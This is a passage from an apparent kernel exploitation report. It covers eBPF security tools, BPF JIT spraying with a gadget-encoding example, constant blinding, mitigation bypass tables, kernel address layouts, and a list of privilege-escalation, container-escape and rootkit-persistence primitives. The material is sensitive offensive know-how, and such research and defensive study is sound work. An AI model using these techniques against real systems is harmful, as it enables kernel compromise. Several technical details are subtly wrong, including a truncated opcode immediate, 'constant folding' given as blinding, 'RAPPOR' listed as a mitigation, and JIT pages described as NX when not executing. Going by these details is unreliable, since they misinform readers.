      - action: SIGKILL    # Block the module from loading
```

```c
// Tetragon eBPF enforcement architecture:
// 1. Tetragon loads BPF programs at kprobes, tracepoints, and LSM hooks
// 2. When a kernel event triggers, BPF program evaluates policy
// 3. If policy matches, BPF program can:
//    - Log the event (observability)
//    - Send signal to kill the process (enforcement)
//    - Override return value (block operation)
//
// Key difference from Falco: Tetragon can ENFORCE policy inline
// in the BPF program, before the kernel operation completes.
// Falco only OBSERVES events and generates alerts asynchronously.
```

#### eBPF Security Tool Comparison

| Feature | Falco | Tetragon | BPFTrace |
|---------|-------|----------|----------|
| **Primary use** | Detection | Enforcement | Debugging |
| **BPF program types** | tracepoint, kprobe | kprobe, tracepoint, LSM | kprobe, uprobe, tracepoint |
| **Policy language** | YAML rules | YAML + CEL | One-liner scripts |
| **Enforcement** | No (alert only) | Yes (SIGKILL, SIGTERM, override) | No |
| **Overhead** | Low | Low-Medium | Variable (depends on probe) |
| **Container-aware** | Yes | Yes | Partial |
| **Network visibility** | Yes (via Falco plugins) | Yes (via Cilium) | Limited |
| **Kernel version** | 4.14+ | 5.4+ (LSM needs 5.7+) | 4.9+ |

### 5.3 JIT Spraying in eBPF

**JIT spraying** is an attack that exploits the BPF JIT compiler to inject arbitrary machine code into executable kernel memory:

#### Attack Principle

The BPF JIT compiler transforms BPF bytecode into native machine code (x86_64, arm64, etc.). The attacker constructs BPF programs whose JIT output contains **gadget sequences** that can be used as ROP/JOP targets:

```c
// JIT spraying conceptual overview:
// 1. Craft BPF program with carefully chosen immediates
// 2. BPF JIT emits native code with attacker-chosen byte sequences
// 3. These byte sequences form useful ROP gadgets when jumped to
//    at unaligned offsets (the JIT output is a single contiguous
//    executable region — predictable layout)

// Example: Crafting a "pop rdi; ret" gadget via BPF immediates
// BPF instruction: BPF_MOV64_IMM(BPF_REG_0, 0x5cc35f415e415f41)
// This becomes in JIT output:
//   0:  48 bf 41 5f 41 5e 41 5c c3   movabs rdi, 0x5cc35f415e415f41
//                            ^^^^^^^   unaligned read at offset +2:
//                                      41 5f     pop rdi
//                                      41 5e     pop rsi
//                                      41 5c     pop r12
//                                      c3        ret
// This gives us a "pop rdi; pop rsi; pop r12; ret" gadget
// at JIT output address + 2!
```

```c
// JIT spraying attack chain:
// 1. Load BPF program with crafted immediates
//    → JIT compiles to kernel executable memory
// 2. Leak JIT code address (via /proc/kallsyms, info leak, or KASLR bypass)
// 3. Corrupt a function pointer to point to an unaligned offset
//    within the JIT output
// 4. When the corrupted function pointer is called,
//    execution jumps to the injected gadget sequence
// 5. Chain gadgets from multiple JIT-shipped blocks

// Modern mitigations against JIT spraying:
// CONFIG_BPF_JIT_ALWAYS_ON    → JIT is always enabled (no interpreter fallback)
// CONFIG_BPF_JIT_CONSTANT_BLINDING → XOR-masks immediate values in JIT output
// Randomized JIT region       → JIT code placed at randomized addresses
// Page-table NX enforcement   → JIT code pages are NX when not executing
```

#### Constant Blinding

Modern kernels apply **constant blinding** (also called **constant folding** or **immediate blinding**) to BPF JIT output to prevent gadget creation:

```c
// Without constant blinding:
// BPF: mov r0, 0x41414141
// JIT: 48 c7 c0 41 41 41 41    mov rax, 0x41414141
//      ↑ attacker can use bytes at unaligned offsets

// With constant blinding (CONFIG_BPF_JIT_CONSTANT_BLIND):
// BPF: mov r0, 0x41414141
// JIT: 48 b8 <random> <random> <random> <random> <random> <random> <random> <random>  mov rax, <random_immediate>
//      48 35 <random> <random> <random> <random>                                          xor rax, <same_random>
//      Result: rax = 0x41414141 (correct value)
//      But the immediate bytes are randomized — no useful gadgets

// Constant blinding mechanism:
// For each BPF immediate value X, the JIT emits:
//   mov R, RANDOM_CONST
//   xor R, (X ^ RANDOM_CONST)
// This means no single immediate contains the desired gadget bytes
// and the XOR result is only visible at runtime
```

#### BPF JIT Spraying Bypass Techniques

| Technique | Description | Status |
|-----------|-------------|--------|
| **Multi-gadget chaining** | Chain gadgets from multiple BPF programs' JIT output | Mitigated by randomization |
| **eBPF interpreter spraying** | Use classic BPF interpreter as gadget source | Mitigated (CONFIG_BPF_JIT_ALWAYS_ON) |
| **cBPF to eBPF to JIT** | Craft cBPF that compiles to eBPF with useful immediates | Mitigated by constant blinding |
| **BPF map value spraying** | Place ROP gadgets in BPF map values (executable on older kernels) | Mitigated by NX map values |
| **JIT region disclosure** | Leak JIT code address via side channel | Partially mitigated by KASLR |
| **ALU64 optimization bypass** | Exploit JIT ALU optimization path to avoid blinding | Patched (CVE-2023-2163 variant) |

---

## Appendix A: Exploitation Mitigation Summary

| Mitigation | Introduced | Scope | Bypass |
|-----------|------------|-------|--------|
| **SMEP/ PXN** | Linux 3.0 / W8+ | Ring 0 → Ring 3 execution | kROP, CR4 modification, Ret2dir |
| **SMAP** | Linux 3.7 / W10+ | Ring 0 → Ring 3 data access | copy_from_user abuse, AC flag, physmap |
| **KASLR** | Linux 3.14 / W8+ | Kernel text randomization | Info leaks, side channels, /proc |
| **KPTI** | Linux 4.15 / W10+ | Kernel/user page table isolation | N/A (hardening, not bypassable) |
| **CFI** | Linux 5.13+ (Clang) | Forward-edge control flow | Missing CFI in some call sites |
| **RAPPOR/RANDSTRUCT** | Linux 5.13+ | Structure layout randomization | Per-structure info leaks |
| **KFENCE** | Linux 5.12+ | Linear allocation for UAF detection | Cannot bypass; only detects |
| **SLAB_FREELIST_HARDENED** | Linux 4.14+ | XOR-obfuscated freelist | Corrupt object payloads instead |
| **INIT_ON_ALLOC** | Linux 5.4+ | Zero-allocate new slab objects | Use previously freed-with-data objects |
| **INIT_ON_FREE** | Linux 5.6+ | Zero freed slab objects | Race window before zeroing |
| **Static Calls** | Linux 5.10+ | Replace indirect calls with direct | Target static call infrastructure |
| **LOS (Lockdown)** | Linux 5.4+ | Restrict /dev/mem, kexec, BPF | Boot parameter bypass |
| **Secure Boot** | UEFI 2.3+ | Verify boot chain | BlackLotus-style Secure Boot bypass |
| **BTI (Branch Target Identification)** | ARM 8.5+ | Verify indirect branch targets | Missing BTI in some paths |
| **IBT (Indirect Branch Tracking)** | x86 CET-IBT | Verify indirect branch targets | Gadget chains with valid ENDBR64 |
| **Constant Blinding** | Linux 4.7+ | XOR-mask BPF JIT immediates | Multi-gadget chaining, interpreter |
| **PatchGuard** | Windows 64-bit | Periodic kernel integrity check | Race window, unpatch after check, VMM |

---

## Appendix B: Key Addresses and Offsets (x86_64 Linux)

```
Virtual Address Space Layout (KASLR disabled):
  0xffffffff80000000  __START_KERNEL_map
  0xffffffff81000000  _text (kernel text start)
  0xffffffff82000000  _etext (kernel text end)  
  0xffffffff82800000  __rodata_start
  0xffffffff83000000  __data_start
  0xffff888000000000  direct mapping (physmap)
  0xffffc90000000000  vmalloc region
  0xffffea0000000000  vmemap (struct page array)
  0xffffffffffffe000  CPU entry area (per-CPU stacks)

With KASLR (randomization offsets):
  _text:           0xffffffff81000000 + (KASLR_OFFSET & ~0x1FFFFF)
  vmalloc_base:    0xffffc90000000000 + (KASLR_OFFSET * some_factor)
  vmemmap_base:    0xffffea0000000000 + (KASLR_OFFSET * some_factor)

Kernel .text size: typically 20-40 MB
KASLR entropy:     ~512 positions (9 bits) for _text
```

---

## Appendix C: Quick Reference — Common Kernel Exploitation Primitives

| Primitive | How to Obtain | What It Enables |
|-----------|---------------|----------------|
| **Arbitrary kernel read** | OOB read (msg_msg, pipe_buffer), corrupted `next` pointer | KASLR bypass, structure offset discovery |
| **Arbitrary kernel write** | UAF with controlled object, type confusion | Function pointer overwrite, cred modification |
| **Kernel RIP control** | Corrupted vtable (pipe_buffer->ops), function pointer | ROP chain execution |
| **Stack pivot** | Controlled RSP write, corrupted saved RSP | Redirect to controlled ROP chain |
| **Privilege escalation** | `commit_creds(init_cred)`, `commit_creds(prepare_kernel_cred(0))`, modprobe_path overwrite | UID 0, full root |
| **Container escape** | `nsproxy` overwrite, cgroup escape via `/proc/.../cgroup` | Access to host namespace |
| **Persistence** | LKM rootkit, init.d script, cron, EFI bootkit, systemd unit | Survive reboot |

---

*End of report. This document covers offensive techniques for authorized security research and defensive understanding only.*